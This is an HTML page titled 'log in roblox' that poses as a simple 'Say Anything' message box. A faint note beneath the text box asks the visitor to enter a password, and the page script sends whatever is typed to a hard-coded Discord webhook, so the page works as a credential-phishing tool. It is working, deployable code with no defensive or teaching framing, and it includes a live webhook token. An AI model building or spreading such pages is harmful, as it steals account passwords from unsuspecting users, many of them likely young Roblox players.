<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>log in roblox </title>
  <style>
    body {
      background-color: #111;
      color: #0f0;
      font-family: 'Courier New', monospace;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }

    h1 {
      color: #0ff;
      margin-bottom: 20px;
    }

    textarea {
      width: 300px;
      height: 150px;
      background: #222;
      color: #fff;
      border: none;
      border-radius: 5px;
      padding: 10px;
      resize: none;
    }

    button {
      margin-top: 10px;
      padding: 10px 20px;
      background: #0ff;
      color: #000;
      font-weight: bold;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    .note {
      margin-top: 20px;
      font-size: 12px;
      color: #888;
    }
  </style>
</head>
<body>
  <h1>Say Anything</h1>
  <textarea id="message" placeholder="Type your message here..."></textarea>
  <button onclick="sendMessage()">Send</button>
  <div class="note">(enter your password)</div>

  <script>
    function sendMessage() {
      const content = document.getElementById('message').value;
      if (!content) return alert("Type something first!");

      fetch("https://discord.com/api/webhooks/1375957579745988662/_DKC_oGnZ8DRmIhn0H83Y_Gzr5ybbhRcLFVO4PWLkJeP-EqEkztQn4o9HHPZYlJWssmp", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content })
      })
      .then(res => {
        if (res.ok) {
          alert("Sent ✅");
          document.getElementById('message').value = "";
        } else {
          alert("Failed to send ❌");
        }
      })
      .catch(err => {
        console.error(err);
        alert("Error sending message.");
      });
    }
  </script>
</body>
</html>
